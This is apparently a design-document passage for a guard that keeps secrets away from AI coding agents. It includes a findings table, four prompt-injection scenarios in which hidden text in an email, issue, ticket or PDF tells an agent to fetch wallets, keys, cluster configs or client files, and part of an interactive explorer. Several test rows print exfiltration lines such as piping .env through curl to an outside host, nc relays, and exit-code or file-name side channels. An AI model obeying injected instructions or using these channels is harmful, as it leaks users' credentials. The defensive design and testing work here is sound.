+<p>One mechanism per finding, with the ledger it reads, the decision the plan records, the test that must fail on today's code first (§7 step 1's rule; two rows pin a fact instead), and the §7 step. R1 is the only one that changes what the guard must know; the diagram shows it as an extension of §4.5's table.</p>
+<h3>(a) R1: the reverse index beside §4.5's open-sink table</h3>
+<div class="fig">
+<svg viewBox="0 0 960 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 15a: the three ledgers the guard joins when a file takes a label">
+  <rect class="bx" x="16" y="30" width="200" height="72"/>
+  <text class="c b" x="116" y="50">open-sink table (§4.5)</text>
+  <text class="c s11" x="116" y="66">holder → destinations connected,</text>
+  <text class="c s11" x="116" y="80">files open for writing</text>
+  <text class="c s11 muted" x="116" y="94">(step 6, as planned)</text>
+
+  <rect class="bx-ok" x="16" y="112" width="200" height="58"/>
+  <text class="c b" x="116" y="132">reverse index (new)</text>
+  <text class="c s11" x="116" y="148">file → holders that have it</text>
+  <text class="c s11" x="116" y="162">open for reading</text>
+
+  <rect class="bx" x="16" y="180" width="200" height="58"/>
+  <text class="c b" x="116" y="200">holder ledger (D7)</text>
+  <text class="c s11" x="116" y="216">pid → call root; long-lived trees;</text>
+  <text class="c s11 muted" x="116" y="230">listener pid by socket inode</text>
+
+  <path class="ln ln-a" d="M216,66 H300"/>
+  <path class="ln ln-a" d="M216,141 H300"/>
+  <path class="ln ln-a" d="M216,209 H300"/>
+
+  <rect class="gate" x="302" y="30" width="260" height="208"/>
+  <text class="c b" x="432" y="52">when f takes a label, at the write-open</text>
+  <text class="s11" x="314" y="76">1. readers(f) = holders with f open for</text>
+  <text class="s11" x="314" y="90">   reading, other than the writer</text>
+  <text class="s11" x="314" y="110">2. for each such holder h:</text>
+  <text class="s11" x="314" y="124">   Label(h) ∩= Label(writer)</text>
+  <text class="s11" x="314" y="144">3. sinks(h) from the open-sink table,</text>
+  <text class="s11" x="314" y="158">   the pipe and socket peers included</text>
+  <text class="s11" x="314" y="178">4. if some sink ∉ Label(h): this write-open</text>
+  <text class="s11" x="314" y="192">   is the later event: refuse or ask</text>
+  <text class="s11 muted" x="314" y="226">first form: refuse whenever readers(f) ≠ ∅</text>
+
+  <path class="ln-secret" d="M562,100 H630"/>
+  <rect class="bx-secret-o" x="632" y="76" width="312" height="48"/>
+  <text class="c b secret" x="788" y="96">the labeling write is refused</text>
+  <text class="c s11" x="788" y="112">EACCES on the write-open, plus the [mandu:secret] note</text>
+
+  <path class="ln" d="M562,168 H630" style="marker-end:url(#ah)"/>
+  <rect class="bx-mid" x="632" y="144" width="312" height="48"/>
+  <text class="c b mid" x="788" y="164">or held as an Inbox row</text>
+  <text class="c s11" x="788" y="180">"write .env bytes where tail → curl → urlpost.com reads?"</text>
+
+  <path class="ln-ok" d="M562,220 H630"/>
+  <rect class="bx-ok" x="632" y="200" width="312" height="38"/>
+  <text class="c s11" x="788" y="216">no other reader, or every sink in the label:</text>
+  <text class="c s11" x="788" y="230">the write proceeds; the file takes ref{…} (§4.6)</text>
+</svg>
+</div>
+<h3>(b) All five, with the decision and the test</h3>
+<div class="tw"><table>
+  <thead><tr><th>finding</th><th>mechanism</th><th>decision to record</th><th>tests that must fail today</th><th>§7</th></tr></thead>
+  <tbody>
+    <tr><td class="k">R1 the reader that holds the descriptor (Fig. 10)</td><td>The guard's open handler records reads of governed files per holder (it already records secret opens) and keeps the reverse index; the write-open that labels a file consults it as in (a). Holders joined by a pipe, a FIFO or a localhost / AF_UNIX connect to an interposed listener share their open-sink tables. The first form ships with step 6's table; the join follows.</td><td>§4.5 gains its second sentence: a file taking a label is a source event for every holder reading it. §4.9's boundary is unchanged (a relay the session started is inside it, and stays inside).</td><td>Unit: the fold over two holders sharing a file; over two joined by a socket. E2e under the interposer, each asserting the fake sink receives no byte: the two-call script of Figure 10; <code>nc -l</code> in call 1 and a tainted <code>nc localhost</code> in call 2; the same through <code>/dev/shm</code>.</td><td>1, 6</td></tr>
+    <tr><td class="k">R2 <i>Always</i> per source (Fig. 11)</td><td>The row of §5.4 renders one <i>Always</i> per source, each a <code>PolicyEdit</code> (<code>bind</code> on that path) through <code>policyPropose</code>, approved by the click on the human plane; the send proceeds when every source allows the destination. A source with no bindings gets a labeled button. The row computes and names the blocking source.</td><td>One answer never writes to a file the button did not name.</td><td>Unit: a two-source hold answered for one source still refuses. E2e (<code>approval-loop</code>): "Always for .env" alone → refused; both → allowed; <code>policy.yaml</code> gains one binding per answered source and nothing on the other.</td><td>10</td></tr>
+    <tr><td class="k">R3 the session holder (Fig. 12)</td><td><code>SessionLabels.raise</code> intersects bindings and keeps <code>max(level)</code> (the session twin of D1). <code>/api/home</code> shows the session's label with the declassified files (the <code>declassifySymbol</code> log). <code>declassify_symbol</code> on a file whose label would empty the session's destinations answers with an ask first. An ask raised for the session holder lists the declassified files and the excluding one, as §5.4's row lists a process's sources.</td><td>§4.3: the session's destinations intersect. D1 names both sites.</td><td>Unit: <code>raise</code> over two disjoint binding sets → ∅ (today: the union). E2e: two rung 3 reads, then a send to the first file's binding → an ask naming the second file; <i>Allow this session</i> → allowed; a new session → clean.</td><td>4, 10</td></tr>
+    <tr><td class="k">R4a the boundary (Fig. 13a)</td><td>The names a tainted holder creates are registered as session secrets at the write-open (the gate sees the path), so the verbatim backstop masks them in any later result; a masked result carries <code>is_error: false</code>. §4.9's list shrinks to sizes, timing and one bit.</td><td>"Output" is the whole result block plus the names the holder creates; the excluded channels are size, mtime, timing, <code>is_error</code>.</td><td>E2e per channel, asserting neither the value nor its digits reach the upstream: <code>sys.exit(ord(key[0]))</code> and <code>sys.stderr.write(key)</code> (pin a fact: expected to pass today); <code>open(key, "w")</code> then <code>ls</code> (fails today).</td><td>1</td></tr>
+    <tr><td class="k">R4b the exits (Fig. 13b)</td><td>The launcher reads <code>/proc/self/mountinfo</code>: paths under network and FUSE mounts are destinations, checked like a synced root (step 12's rule, one more table). The arbiter <code>chmod 0600</code>s a file when it labels it. The display socket is a destination. Device nodes go into §4.9.</td><td>Which rows are step 12 and which are §4.9.</td><td>E2e: a tainted write under a FUSE mount in the test VM → ask; a derived file is <code>0600</code>; <code>xclip</code> from a tainted holder → refused.</td><td>12</td></tr>
+    <tr><td class="k">R5 three smaller (Fig. 14)</td><td>The opt-out is an Inbox row / dashboard action. The interpreter opener is <code>(interpreter, script path + hash)</code> via the exec identifier; inline code gets no opener. The catalog rows with a canonical host carry <code>bindings</code>; a user entry overrides.</td><td>One sentence each in §4.8, §7 step 8 and §5.1.</td><td>E2e per proxy: an agent-written "let it through" does not release a symbol. Unit: <code>python3 -c</code> is no opener when <code>python3</code> is listed. E2e: the AWS symbol releases at <code>*.amazonaws.com</code> with no <code>policy.yaml</code>.</td><td>7, 8, §5.1</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 15. How to address the five findings. R1 adds a reverse index beside the table step 6 already builds, with a fail-closed first form; R2 and R3 are the same row seen from a process holder and from the session; R4 is one registration and four sentences; R5 is three sentences and one catalog column. Every row's test fails on today's code first, except the two R4a rows that pin a fact.</figcaption>
+</figure>
+
+<!-- ============ Figure 16 ============ -->
+<h2>Figure 16. Four stories: what the gates do for four kinds of user</h2>
+<figure>
+<p>The same gates, seen by four users. In each, an instruction hidden in content the agent reads (an email, an issue, a ticket, a PDF) asks for something labeled. Mode <code>secrets</code> does not hide that text from the model, so the agent may well follow it. The defense is that a fooled agent holds only placeholders: the provider sees a symbol, an unbound destination gets a symbol or an Inbox row, and the human still sees the originals. Every panel shows today's behavior.</p>
+
+<h3>(a) At home: a personal assistant and a wallet backup</h3>
+<div class="fig">
+<svg viewBox="0 0 960 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 16a: a personal assistant asked for a wallet backup; the provider and the sender get a placeholder">
+  <rect class="bx-ph" x="16" y="16" width="200" height="44"/>
+  <text class="c b" x="116" y="34">an email</text>
+  <text class="c s11" x="116" y="50">hidden text asks for the wallet file</text>
+  <path class="bx-secret-o" d="M16,84 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,84 v16 h16"/>
+  <text class="c m" x="108" y="103">wallet-backup.txt</text>
+  <text class="c s11 secret" x="108" y="118">no-model</text>
+  <path class="bx-mid" d="M16,140 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,140 v16 h16"/>
+  <text class="c m" x="108" y="159">tax-return-2025.pdf</text>
+  <text class="c s11 mid" x="108" y="174">any-model</text>
+  <path class="ln ln-a" d="M216,38 L258,66"/>
+  <path class="ln ln-a" d="M216,106 L258,92"/>
+  <path class="ln ln-a" d="M216,162 L258,116"/>
+
+  <rect class="bx" x="260" y="44" width="220" height="92"/>
+  <text class="c b" x="370" y="64">assistant (OpenClaw)</text>
+  <text class="c s11" x="370" y="82">follows the email, asks for the file</text>
+  <text class="c m" x="370" y="99">gets $MDU:nomodel_Read[…]</text>
+  <text class="c s11 muted" x="370" y="124">secrets mode does not hide the email</text>
+  <path class="ln ln-a" d="M480,90 H514"/>
+
+  <rect class="gate" x="516" y="16" width="36" height="168"/>
+  <text class="c b s11" transform="translate(538,100) rotate(-90)">model proxy · egress</text>
+  <path class="ln ln-a" d="M552,38 H590"/><path class="ln ln-a" d="M552,100 H590"/><path class="ln ln-a" d="M552,162 H590"/>
+
+  <rect class="bx" x="592" y="16" width="190" height="44"/>
+  <text class="c b" x="687" y="34">AI provider</text>
+  <text class="c m" x="687" y="50">sees $MDU:… only</text>
+  <rect class="bx-mid" x="592" y="78" width="190" height="44"/>
+  <text class="c b" x="687" y="96">reply to the sender</text>
+  <text class="c s11 mid" x="687" y="112">not a binding: Inbox ask</text>
+  <rect class="bx-ok" x="592" y="140" width="190" height="44"/>
+  <text class="c b" x="687" y="158">Minji's screen</text>
+  <text class="c s11 ok" x="687" y="174">originals (reply filter)</text>
+
+  <text class="s11" x="796" y="34">the phrase never leaves</text>
+  <text class="s11" x="796" y="48">the machine</text>
+  <text class="s11" x="796" y="96">Block: the sender gets</text>
+  <text class="s11" x="796" y="110">a string worth nothing</text>
+  <text class="s11" x="796" y="158">"what was my refund?"</text>
+  <text class="s11" x="796" y="172">answered by the helper</text>
+</svg>
+</div>
+
+<h3>(b) A programmer: "fix issue #412"</h3>
+<div class="fig">
+<svg viewBox="0 0 960 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 16b: a coding agent and a package script get twins and placeholders; the bound API gets the real key">
+  <rect class="bx-ph" x="16" y="16" width="200" height="44"/>
+  <text class="c b" x="116" y="34">an issue, a new package</text>
+  <text class="c s11" x="116" y="50">both reach for the keys</text>
+  <path class="bx-secret-o" d="M16,84 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,84 v16 h16"/>
+  <text class="c m" x="108" y="103">.env</text>
+  <text class="c s11" x="108" y="118"><tspan class="secret">no-model</tspan> · bind api.stripe.com</text>
+  <path class="bx-secret-o" d="M16,140 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,140 v16 h16"/>
+  <text class="c m" x="108" y="159">~/.aws/credentials</text>
+  <text class="c s11" x="108" y="174"><tspan class="secret">no-model</tspan> · readers aws, vouched</text>
+  <path class="ln ln-a" d="M216,38 L258,66"/>
+  <path class="ln ln-a" d="M216,106 L258,92"/>
+  <path class="ln ln-a" d="M216,162 L258,116"/>
+
+  <rect class="bx" x="260" y="44" width="220" height="92"/>
+  <text class="c b" x="370" y="64">Claude Code and what it runs</text>
+  <text class="c s11" x="370" y="82">the agent and node get the twin</text>
+  <text class="c s11" x="370" y="97">an unlisted program: EACCES</text>
+  <text class="c s11" x="370" y="112">git history: the old key is withheld</text>
+  <text class="c s11 muted" x="370" y="128">aws, vouched (prints: nothing), gets raw bytes</text>
+  <path class="ln ln-a" d="M480,90 H514"/>
+
+  <rect class="gate" x="516" y="16" width="36" height="168"/>
+  <text class="c b s11" transform="translate(538,100) rotate(-90)">proxy · egress · fs</text>
+  <path class="ln ln-a" d="M552,38 H590"/><path class="ln ln-a" d="M552,100 H590"/><path class="ln ln-a" d="M552,162 H590"/>
+
+  <rect class="bx-ok" x="592" y="16" width="190" height="44"/>
+  <text class="c b m" x="687" y="34">api.stripe.com</text>
+  <text class="c s11 ok" x="687" y="50">bound: the symbol is released</text>
+  <rect class="bx-mid" x="592" y="78" width="190" height="44"/>
+  <text class="c b" x="687" y="96">any other host</text>
+  <text class="c s11 mid" x="687" y="112">$MDU:… only; Inbox row</text>
+  <rect class="bx" x="592" y="140" width="190" height="44"/>
+  <text class="c b" x="687" y="158">AI provider</text>
+  <text class="c m" x="687" y="174">sees $MDU:… only</text>
+
+  <text class="s11" x="796" y="34">the tests still pass</text>
+  <text class="s11" x="796" y="48">with the real key</text>
+  <text class="s11" x="796" y="96">the key is useless</text>
+  <text class="s11" x="796" y="110">to anyone else</text>
+  <text class="s11" x="796" y="158">no key in the context,</text>
+  <text class="s11" x="796" y="172">old commits included</text>
+</svg>
+</div>
+
+<h3>(c) An IT company: production credentials and proprietary code</h3>
+<div class="fig">
+<svg viewBox="0 0 960 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 16c: a cluster token stays a placeholder; proprietary code reaches only the company's own model; every release is logged">
+  <rect class="bx-ph" x="16" y="16" width="200" height="44"/>
+  <text class="c b" x="116" y="34">a support ticket</text>
+  <text class="c s11" x="116" y="50">asks for the cluster config in a PR</text>
+  <path class="bx-secret-o" d="M16,84 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,84 v16 h16"/>
+  <text class="c m" x="108" y="103">~/.kube/config</text>
+  <text class="c s11" x="108" y="118"><tspan class="secret">no-model</tspan> · readers deployctl, vouched</text>
+  <path class="bx-mid" d="M16,140 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,140 v16 h16"/>
+  <text class="c m" x="108" y="159">pricing-engine/**</text>
+  <text class="c s11 mid" x="108" y="174">local-model</text>
+  <path class="ln ln-a" d="M216,38 L258,66"/>
+  <path class="ln ln-a" d="M216,106 L258,92"/>
+  <path class="ln ln-a" d="M216,162 L258,116"/>
+
+  <rect class="bx" x="260" y="44" width="220" height="92"/>
+  <text class="c b" x="370" y="64">coding agent</text>
+  <text class="c s11" x="370" y="82">deployctl's output: a symbol</text>
+  <text class="c s11" x="370" y="97">pricing code: a placeholder</text>
+  <text class="c s11" x="370" y="112">deployctl still reaches the cluster</text>
+  <text class="c s11 muted" x="370" y="128">kubectl, not vetted, reads the placeholder</text>
+  <path class="ln ln-a" d="M480,90 H514"/>
+
+  <rect class="gate" x="516" y="16" width="36" height="168"/>
+  <text class="c b s11" transform="translate(538,100) rotate(-90)">proxy · egress · events</text>
+  <path class="ln ln-a" d="M552,38 H590"/><path class="ln ln-a" d="M552,100 H590"/><path class="ln ln-a" d="M552,162 H590"/>
+
+  <rect class="bx" x="592" y="16" width="190" height="44"/>
+  <text class="c b" x="687" y="34">the pull request</text>
+  <text class="c m" x="687" y="50">contains $MDU:… only</text>
+  <rect class="bx-ok" x="592" y="78" width="190" height="44"/>
+  <text class="c b" x="687" y="96">company vLLM</text>
+  <text class="c s11 ok" x="687" y="112">declared local: reads raw</text>
+  <rect class="bx-ok" x="592" y="140" width="190" height="44"/>
+  <text class="c b" x="687" y="158">dashboard and SIEM</text>
+  <text class="c s11 ok" x="687" y="174">every release and approval</text>
+
+  <text class="s11" x="796" y="34">a public PR leaks</text>
+  <text class="s11" x="796" y="48">nothing usable</text>
+  <text class="s11" x="796" y="96">the cloud model never</text>
+  <text class="s11" x="796" y="110">sees the pricing code</text>
+  <text class="s11" x="796" y="158">the audit answers which</text>
+  <text class="s11" x="796" y="172">data reached which model</text>
+</svg>
+</div>
+
+<h3>(d) A law firm: other clients' matters</h3>
+<div class="fig">
+<svg viewBox="0 0 960 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 16d: a document agent asked for other clients' matters gets placeholders; sending one outside asks the associate first">
+  <rect class="bx-ph" x="16" y="16" width="200" height="44"/>
+  <text class="c b" x="116" y="34">a PDF from the other side</text>
+  <text class="c s11" x="116" y="50">asks for other clients' matters</text>
+  <path class="bx-mid" d="M16,84 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,84 v16 h16"/>
+  <text class="c m" x="108" y="103">clients/2291-shipco/</text>
+  <text class="c s11 mid" x="108" y="118">local-model</text>
+  <path class="bx-mid" d="M16,140 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,140 v16 h16"/>
+  <text class="c m" x="108" y="159">clients/**</text>
+  <text class="c s11 mid" x="108" y="174">any-model</text>
+  <path class="ln ln-a" d="M216,38 L258,66"/>
+  <path class="ln ln-a" d="M216,106 L258,92"/>
+  <path class="ln ln-a" d="M216,162 L258,116"/>
+
+  <rect class="bx" x="260" y="44" width="220" height="92"/>
+  <text class="c b" x="370" y="64">document agent</text>
+  <text class="c s11" x="370" y="82">looks for the other matters</text>
+  <text class="c s11" x="370" y="97">gets placeholders</text>
+  <text class="c s11" x="370" y="112">the helper answers questions</text>
+  <text class="c s11 muted" x="370" y="128">the letter itself stays readable</text>
+  <path class="ln ln-a" d="M480,90 H514"/>
+
+  <rect class="gate" x="516" y="16" width="36" height="168"/>
+  <text class="c b s11" transform="translate(538,100) rotate(-90)">model proxy · egress</text>
+  <path class="ln ln-a" d="M552,38 H590"/><path class="ln ln-a" d="M552,100 H590"/><path class="ln ln-a" d="M552,162 H590"/>
+
+  <rect class="bx" x="592" y="16" width="190" height="44"/>
+  <text class="c b" x="687" y="34">AI provider</text>
+  <text class="c m" x="687" y="50">sees $MDU:… only</text>
+  <rect class="bx-mid" x="592" y="78" width="190" height="44"/>
+  <text class="c b" x="687" y="96">email to the other side</text>
+  <text class="c s11 mid" x="687" y="112">symbol with no binding: ask</text>
+  <rect class="bx-ok" x="592" y="140" width="190" height="44"/>
+  <text class="c b" x="687" y="158">the associate's screen</text>
+  <text class="c s11 ok" x="687" y="174">originals (reply filter)</text>
+
+  <text class="s11" x="796" y="34">the matter does not</text>
+  <text class="s11" x="796" y="48">leave the firm</text>
+  <text class="s11" x="796" y="96">the Inbox names the</text>
+  <text class="s11" x="796" y="110">matter before sending</text>
+  <text class="s11" x="796" y="158">the draft stays useful</text>
+  <text class="s11" x="796" y="172">for this letter</text>
+</svg>
+</div>
+
+<h3>(e) The four stories side by side</h3>
+<div class="tw"><table>
+  <thead><tr><th>story</th><th>what is labeled</th><th>the fooled agent ends up with</th><th>the user keeps</th><th>mechanism (all today)</th></tr></thead>
+  <tbody>
+    <tr><td class="k">(a) home</td><td>wallet backup <span class="lv hi">no-model</span>; tax return <span class="lv mid">any-model</span></td><td><span class="chip sym">symbol</span>, and an <span class="chip ask">ask</span> before any send</td><td>answers about the tax return through the helper (rung 2)</td><td>model-API proxy, egress release at bindings, Inbox, reply filter</td></tr>
+    <tr><td class="k">(b) programmer</td><td><code>.env</code>, <code>~/.aws/credentials</code> <span class="lv hi">no-model</span></td><td><span class="chip sym">twin</span> or <span class="chip deny">EACCES</span>; history without the old key</td><td>tests (the placeholder is put back at the bound host) and <code>aws</code> (vouched with <code>prints: nothing</code>) work with the real values</td><td>twins, <code>readers</code>, <code>bindings</code>, git object-store twins (§7.2a)</td></tr>
+    <tr><td class="k">(c) IT company</td><td>kubeconfig <span class="lv hi">no-model</span>; pricing code <span class="lv mid">local-model</span></td><td><span class="chip sym">symbol</span> in the PR and the context</td><td>the company's <code>deployctl</code>, vouched with <code>prints: nothing</code>; a local model that reads the code</td><td><code>readers</code>, declared <code>local: true</code> endpoint, events</td></tr>
+    <tr><td class="k">(d) law firm</td><td>client folders <span class="lv mid">any-model</span> / <span class="lv mid">local-model</span></td><td><span class="chip sym">symbol</span>, and an <span class="chip ask">ask</span> before the email</td><td>a draft of this letter; answers through the helper</td><td>model-API proxy, quarantined helper, Inbox, reply filter</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 16. Four users, one rule: a labeled value reaches a model only as a symbol unless its level admits that model, and leaves the machine only at a binding or with the human's approval. The stories stop at what <code>secrets</code> mode claims. It protects <i>data</i>, not <i>actions</i>: an instruction that asks for an action rather than a labeled value is the frozen integrity axis. The open items that bound these panels are Plan 13's own: the defects of §3, prompt scanning (§4.8, decided, not built), and what the model does not cover (§4.9, §9).</figcaption>
+</figure>
+
+<script>
+(function () {
+  var OBJ = {
+    readme:      { name: "README.md", level: "public", readers: null, bind: [] },
+    contract:    { name: "docs/contract.pdf", level: "any-model", readers: null, bind: ["gmail.com"] },
+    customers:   { name: "data/customers.csv", level: "local-model", readers: ["python3"], bind: [] },
+    env:         { name: ".env", level: "no-model", readers: ["python3"], bind: ["github.com"] },
+    mycnf:       { name: "~/.my.cnf", level: "no-model", readers: ["mysql"], bind: ["db.internal"] },
+    promptReg:   { name: ".env's GITHUB_TOKEN", level: "no-model", readers: null, bind: ["github.com"], prompt: true, registered: true },
+    promptUnreg: { name: "the pasted token", level: "no-model", readers: null, bind: [], prompt: true, registered: false }
+  };
+  var plan = false;
+  function $(id) { return document.getElementById(id); }
+  function chip(kind, text) { return '<span class="chip ' + kind + '">' + text + "</span> "; }
+  function code(t) { return "<code>" + t + "</code>"; }
+  function prog(sub) { return (sub === "pipe" || sub === "proxy") ? "python3" : sub; }
+
+  // Release(d) = Models(level) ∪ Bindings(d) ∪ {human, local storage}
+  function release(o) {
+    if (o.level === "public") return "every sink";
+    var models = { "any-model": ["every declared model"], "local-model": ["declared local models"], "no-model": [] }[o.level];
+    return "{" + ["human"].concat(models, o.bind).join(", ") + "}";
+  }
+
+  // What the READ gives the holder: {kind: raw|sym|twin|deny|na, html}
+  function read(o, sub) {
+    var p = prog(sub);
+    if (o.prompt) {
+      if (sub !== "agent") return { kind: "na", html: chip("sym", "n/a") + "A program never reads the prompt. The agent keeps it, and Claude Code writes it to its transcript on disk; a tool that reads that transcript is the open case of Plan 13 §4.8." };
+      if (!plan) return { kind: "raw", html: chip("raw", "raw") + "User-role text is trusted and forwarded as is. The token is in the provider's copy of the conversation." };
+      if (o.registered) return { kind: "sym", html: chip("sym", "symbol") + "The proxy scans user-role text for the values of registered secrets. The token is " + code(".env") + "'s value, so it is replaced by that secret's symbol, the same stable symbol it has everywhere (Plan 13 §4.8). The rest of the prompt stays raw." };
+      return { kind: "raw", html: chip("raw", "raw") + "The scan matches registered values only; nobody registered this token, so it reaches the model. The shape scan was withdrawn (Plan 14 §1); Plan 14's scans are the answer to secrets nobody registered." };
+    }
+    if (o.level === "public") return { kind: "raw", html: chip("raw", "raw") + "Public: every sink, and every program may open it." };
+    if (sub === "agent") {
+      var extra = { "any-model": "Rung 2 (the helper) and rung 3 (a logged in-context read) are open to it.",
+                    "local-model": "Raw only to a declared local model, as helper or as the main model.",
+                    "no-model": "No model ever reads it raw, the helper included." }[o.level];
+      return { kind: "sym", html: chip("sym", "twin") + "The agent's process is never a reader. Its model sees symbols in place of the values. " + extra };
+    }
+    if (!o.readers) return { kind: "twin", html: chip("sym", "twin") + "No reader list: every program gets the structured twin, keys raw and values as symbols. " + (plan ? "Its holder holds nothing secret." : "The process stays untainted.") };
+    if (o.readers.indexOf(p) >= 0) {
+      var h = chip("raw", "raw") + (plan
+        ? code(p) + " is an opener: raw bytes, and its holder (the tool call's tree) now holds the file. Opening grants nothing to any sink."
+        : code(p) + " is a listed reader: raw bytes, and the process is tainted with the file's level and bindings.");
+      if (sub === "pipe") h += " In the pipeline, only python3 opens the file; curl is its sibling.";
+      return { kind: "raw", html: h };
+    }
+    var g = sub === "git" ? " (A committed version is also missing from git's object store: the launcher's git object-store twins.)" : "";
+    return { kind: "deny", html: chip("deny", "EACCES") + code(p) + " is not " + (plan ? "an opener" : "a listed reader") + ": the list names " + o.readers.map(code).join(", ") + " only, and a list is exhaustive." + g };
+  }
+
+  function hold(o, sub, r) {
+    if (r.kind === "na") return { html: "Nothing from this object." };
+    if (r.kind === "deny") return { html: "Nothing: the open failed. The tool result says why (a " + code("[mandu:secret]") + " note)." };
+    if (r.kind === "raw" && o.level === "public" && !o.prompt) return { html: "Public data; no label." };
+    if (o.prompt && r.kind === "raw") return { html: "The raw token, in the main model's context. It is public as far as Mandu knows." };
+    if (r.kind === "sym" || r.kind === "twin") return { html: "Symbols only. The holder's label does not change." + (sub === "agent" && o.level === "any-model" ? " (A rung 3 read would shrink the session's label: the watermark.)" : "") };
+    if (!plan) {
+      var t = "Raw bytes. The process is tainted: level " + o.level + ", bindings {" + o.bind.join(", ") + "}.";
+      if (sub === "pipe") t += " Only python3 and its children carry it; curl, its sibling, is untainted (D2).";
+      if (sub === "proxy") t += " The taint is checked at a direct " + code("connect()") + " and, since D6 was fixed (2026-10-02), on every leg of the session proxy, HTTPS included.";
+      return { html: t };
+    }
+    var h = "Raw bytes. The holder's label is " + code("Release(" + o.name + ") = " + release(o)) + ".";
+    if (sub === "pipe") h += " One tool call's process tree is one holder, so curl is judged by this label too. That needs the tree recorded at fork and exec (D7).";
+    if (sub === "proxy") h += " The net-proxy resolves the sending process on every leg, HTTPS included.";
+    return { html: h };
+  }
+
+  function send(o, sub, r, sink) {
+    var isStore = sink === "store" || sink === "sync";
+    $("ex-h3").textContent = isStore ? "3 · WRITE" : "3 · SEND";
+    if (r.kind === "na" || r.kind === "deny") return chip("sym", "nothing to send") + "The holder holds nothing from this object.";
+    var publicRaw = r.kind === "raw" && o.level === "public" && !o.prompt;
+    if (publicRaw || (o.prompt && r.kind === "raw")) {
+      if (sink === "sync") return chip("ok", "allowed") + "Written; the sync daemon uploads it." + (o.prompt ? " The token goes with it." : "");
+      return chip("ok", "allowed") + "No label stands in the way." + (o.prompt && plan ? " An unregistered value is outside what Mandu enforces (Plan 13 §4.9)." : "");
+    }
+    if (sink === "human") return chip("ok", "originals") + "The reply filter shows the human the original values.";
+    var bound = o.bind.indexOf(sink) >= 0;
+
+    // symbols only (the agent, a twin, the scanned prompt)
+    if (r.kind === "sym" || r.kind === "twin") {
+      if (sink === "ext") {
+        if (sub === "agent") return chip("sym", "symbol") + "This is the read itself: the main model sees the symbol." + (o.level === "any-model" ? " Rung 3 would put the value in context, logged." : "");
+        return chip("ok", "as is") + "The tool result carries only the twin's symbols; they stay opaque.";
+      }
+      if (sink === "helper") {
+        if (sub !== "agent") return chip("sym", "n/a") + "Only the agent calls the helper (" + code("inspect_symbol") + ").";
+        if (o.level === "any-model") return chip("ok", "rung 2") + "The helper reads the value without the main context; its answer comes back re-symbolized.";
+        if (o.level === "local-model") return chip("deny", "refused") + "The helper here is external. local-model goes only to a declared local helper, never the default one.";
+        return chip("deny", "never") + "no-model: no model reads it, the helper included.";
+      }
+      if (sink === "local") {
+        if (sub !== "agent") return chip("sym", "n/a") + "A program reaches a model only through its tool result. A direct HTTP call to the model server is a network send, checked like a destination.";
+        if (o.level === "no-model") return chip("deny", "never") + "no-model: no model, local ones included.";
+        return chip("ok", "admitted") + "A declared " + code("local: true") + " endpoint admits " + o.level + " data (rung 2 through a local helper, or rung 3 when it is the main model).";
+      }
+      if (isStore) return chip("ok", "symbols written") + "The file holds symbols, so nothing secret lands and no label is needed." + (sub === "agent" ? " (A session above public would give it a derived label.)" : "");
+      if (bound) return chip("ok", "released") + "The symbol is put back to the real value at a binding of " + code(o.name) + " (" + code(sink) + ")" + (sub === "agent" ? "" : ", by the egress proxy") + ".";
+      return chip("ask", "ask") + "Not a binding of " + code(o.name) + ": the symbol is withheld and the request held for the human (an Inbox row).";
+    }
+
+    // raw bytes in a holder (today: a tainted process)
+    if (sink === "ext") {
+      var ruleNote = sub === "mysql" ? " The user may set mysql's output to " + code("clear") + (plan ? " on its reader entry for this file only (Plan 13 §4.2, §5.2)." : ", which today clears mysql's output for every file it reads (D3).") : "";
+      var foldNote = (sub === "pipe" && !plan) ? " The fold needs the call's tree, which today is guessed (D7)." : "";
+      return chip("sym", "symbol") + "The tool result of a call holding the file is folded under its output rule (default: " + code("secret") + "), so the model sees " + code("$MDU:…_Exec[…]") + "." + ruleNote + foldNote;
+    }
+    if (sink === "helper" || sink === "local") {
+      if (!plan) return chip("sym", "n/a") + "A program reaches a model only through its tool result. A direct connection to the model server is a network connect: " + (bound ? "allowed." : "refused, since it is not a binding.");
+      return chip("sym", "n/a") + "A program reaches a model only through its tool result. A direct connection to the model server is a destination: " + (bound ? "allowed." : "outside the holder's label, so an ask.");
+    }
+    if (isStore) {
+      var dst = sink === "sync" ? "~/Dropbox/copy.txt" : "~/ws/out/copy.txt";
+      var via = sub === "pipe" ? " (written by " + code("tee") + " in the pipeline)" : "";
+      if (!plan) {
+        if (sub === "pipe") return chip("raw", "leak") + code(dst) + via + " gets no label: tee is untainted (D2). The next session reads it as public.";
+        if (sink === "sync") return chip("raw", "leak") + code(dst) + " gets a derived label, but the sync daemon outside the session uploads it to dropbox.com anyway.";
+        return chip("raw", "leak") + code(dst) + " gets a derived label at " + o.level + " only: no readers, no bindings. The guard never learns the path, so every program, " + code("curl --data @copy.txt") + " included, opens it raw and untainted, in this session and the next; " + code("mv") + " drops the label (D4).";
+      }
+      if (sink === "sync") return chip("ask", "ask") + "A synced folder is a destination, " + code("sync:dropbox") + ". The write-open" + via + " is checked like a " + code("connect()") + ": " + code("sync:dropbox") + " is not in " + code(release(o)) + ", so it is an ask.";
+      return chip("ok", "allowed") + code(dst) + via + " lands with its label: it refers to " + code(o.name) + "'s, evaluated as " + code(release(o)) + " when checked, so a revoked binding reaches it. The path enters the guard's index and the label follows " + code("rename") + " and " + code("link") + ". Openers are not inherited: every program gets the twin (or EACCES) until a human names an opener." + (sub === "pipe" ? " If tee opened the file before python3's read, the read relabels it on the spot (D5)." : "");
+    }
+    // a destination
+    if (sub === "pipe") {
+      if (!plan && bound) return chip("ok", "allowed") + "curl is untainted, so its " + code("connect()") + " passes unchecked; " + code(sink) + " is a binding of " + code(o.name) + " anyway.";
